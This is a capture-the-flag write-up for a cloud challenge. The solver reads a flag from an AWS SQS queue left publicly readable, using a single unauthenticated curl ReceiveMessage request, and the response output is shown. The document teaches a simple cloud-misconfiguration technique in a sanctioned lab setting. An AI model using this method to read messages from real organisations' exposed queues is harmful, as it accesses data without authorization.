
# Cant stop me now

 * Category: Cloud
 * Solved by the JCTF Team

## Description

> Frankly this challenge is impossible, give up now.
> 
> If you really insists, take this:
> 
> https://sqs.il-central-1.amazonaws.com/447694922079/production-queue

## Solution

We visit the attached link and get the following response:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/cant_stop_me_now]
└─$ curl https://sqs.il-central-1.amazonaws.com/447694922079/production-queue
<UnknownOperationException/>
```

Searching Google for `UnknownOperationException`, the first result is 
[this StackOverflow question](https://stackoverflow.com/questions/29587969/unknownoperationexception-is-always-returned-by-amazon-sqs).

The answer is:

> This is not POST request. It is GET. 
> 
> http://sqs.us-east-1.amazonaws.com/123456789012/testQueue/
> ?Action=ReceiveMessage
> &WaitTimeSeconds=10
> &MaxNumberOfMessages=5
> &VisibilityTimeout=15
> &AttributeName=All;
> &Version=2012-11-05
> &Expires=2013-10-25T22%3A52%3A43PST
> &AUTHPARAMS
> 
> I was not mentioning the request parameters so not getting the result. That was the issue.

The error says "Unknown Operation", let's try adding the `Action`?

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/cant_stop_me_now]
└─$ curl -X POST "https://sqs.il-central-1.amazonaws.com/447694922079/production-queue?Action=ReceiveMessage"
<?xml version="1.0"?><ReceiveMessageResponse xmlns="http://queue.amazonaws.com/doc/2012-11-05/"><ReceiveMessageResult><Message><MessageId>ed400300-c26e-46a5-898f-6dc9ae53f779</MessageId><ReceiptHandle>AQEB3vm6hP/PU+qCzQkNzqtEbtIlJridBzJ/k4Sd5ykeGmt5YTpAwKoyhxDGxeefPpPOmcJUJm/DZ9MzhR8BffHqbbJpvXIUbMXGmdVxCxJDS+L293y0zFZcXnYKH2VeF8B54+wceQx4zHdZ0bb5OqcleGq6+YqxhS6MxzVKd181FpuSAEvuwu99dLZZOa/rjvfCPH+Wm1ofryx+2KXEByKBRHXQ8opBa8P2SsH10X6j+ECZgHSsKT7HtfW2mMzbyTML4AOVJvGnlM+OHZUgbd28+oKEwbooOSzUH5jPa+iZx5NpvW1Oa2grR+G94aw6cvveJwXWnzqI+8kXqB0vvyE5BJRfVR1JZuGhNCVbnC2WVx1sJG72l/9k089FYD5d57djp3kBy08RsIqyaSzYxYO8gw==</ReceiptHandle><MD5OfBody>e6eb62e9f83d493cd95a9278ffdb6128</MD5OfBody><Body>AppSec-IL{mama_look_at_me_i_can_read}</Body></Message></ReceiveMessageResult><ResponseMetadata><RequestId>d0a23b86-a511-525f-b685-5b3d692acc10</RequestId></ResponseMetadata></ReceiveMessageResponse>
```

The flag: `AppSec-IL{mama_look_at_me_i_can_read}`